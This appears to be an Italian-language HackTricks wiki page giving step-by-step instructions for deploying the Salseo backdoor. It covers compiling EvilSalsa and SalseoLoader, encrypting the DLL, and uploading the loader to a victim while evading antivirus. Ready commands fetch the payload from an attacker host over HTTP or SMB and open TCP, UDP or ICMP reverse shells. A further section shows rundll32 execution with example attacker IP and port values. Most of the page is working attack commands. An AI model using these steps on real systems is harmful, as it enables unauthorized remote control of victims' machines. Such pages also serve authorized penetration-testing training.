# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}

## Compiling the binaries

Scarica il codice sorgente da github e compila **EvilSalsa** e **SalseoLoader**. Avrai bisogno di **Visual Studio** installato per compilare il codice.

Compila questi progetti per l'architettura della macchina Windows dove intendi usarli (Se Windows supporta x64, compilali per quell'architettura).

Puoi **selezionare l'architettura** all'interno di Visual Studio nella **scheda "Build" a sinistra** in **"Platform Target".**

(\*\*Se non riesci a trovare queste opzioni, premi su **"Project Tab"** e poi su **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Poi, costruisci entrambi i progetti (Build -> Build Solution) (All'interno dei log apparirà il percorso dell'eseguibile):

![](<../.gitbook/assets/image (381).png>)

## Prepare the Backdoor

Prima di tutto, dovrai codificare il **EvilSalsa.dll.** Per farlo, puoi usare lo script python **encrypterassembly.py** oppure puoi compilare il progetto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ora hai tutto ciò di cui hai bisogno per eseguire tutto il Salseo: il **EvilDalsa.dll codificato** e il **binario di SalseoLoader.**

**Carica il binario SalseoLoader.exe sulla macchina. Non dovrebbero essere rilevati da alcun AV...**

## **Esegui il backdoor**

### **Ottenere una shell inversa TCP (scaricando dll codificata tramite HTTP)**

Ricorda di avviare un nc come listener della shell inversa e un server HTTP per servire l'evilsalsa codificato.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa UDP (scaricando dll codificata tramite SMB)**

Ricorda di avviare un nc come listener della shell inversa e un server SMB per servire l'evilsalsa codificato (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa ICMP (dll codificata già all'interno della vittima)**

**Questa volta hai bisogno di uno strumento speciale nel client per ricevere la shell inversa. Scarica:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Disabilita le risposte ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Esegui il client:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### All'interno della vittima, eseguiamo la cosa salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilare SalseoLoader come DLL esportando la funzione principale

Apri il progetto SalseoLoader utilizzando Visual Studio.

### Aggiungi prima della funzione principale: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Installa DllExport per questo progetto

#### **Strumenti** --> **Gestore pacchetti NuGet** --> **Gestisci pacchetti NuGet per la soluzione...**

![](<../.gitbook/assets/image (881).png>)

#### **Cerca il pacchetto DllExport (utilizzando la scheda Sfoglia) e premi Installa (e accetta il popup)**

![](<../.gitbook/assets/image (100).png>)

Nella tua cartella di progetto sono apparsi i file: **DllExport.bat** e **DllExport\_Configure.bat**

### **Dis**installa DllExport

Premi **Disinstalla** (sì, è strano ma fidati, è necessario)

![](<../.gitbook/assets/image (97).png>)

### **Esci da Visual Studio ed esegui DllExport\_configure**

Basta **uscire** da Visual Studio

Poi, vai nella tua **cartella SalseoLoader** ed **esegui DllExport\_Configure.bat**

Seleziona **x64** (se intendi usarlo all'interno di una macchina x64, questo era il mio caso), seleziona **System.Runtime.InteropServices** (all'interno di **Namespace per DllExport**) e premi **Applica**

![](<../.gitbook/assets/image (882).png>)

### **Apri di nuovo il progetto con Visual Studio**

**\[DllExport]** non dovrebbe più essere contrassegnato come errore

![](<../.gitbook/assets/image (670).png>)

### Compila la soluzione

Seleziona **Tipo di output = Libreria di classi** (Progetto --> Proprietà SalseoLoader --> Applicazione --> Tipo di output = Libreria di classi)

![](<../.gitbook/assets/image (847).png>)

Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compila --> Target piattaforma = x64)

![](<../.gitbook/assets/image (285).png>)

Per **compilare** la soluzione: Compila --> Compila soluzione (All'interno della console di output apparirà il percorso della nuova DLL)

### Testa la DLL generata

Copia e incolla la DLL dove vuoi testarla.

Esegui:
```
rundll32.exe SalseoLoader.dll,main
```
Se non appare alcun errore, probabilmente hai un DLL funzionante!!

## Ottieni una shell usando il DLL

Non dimenticare di usare un **server** **HTTP** e impostare un **listener** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
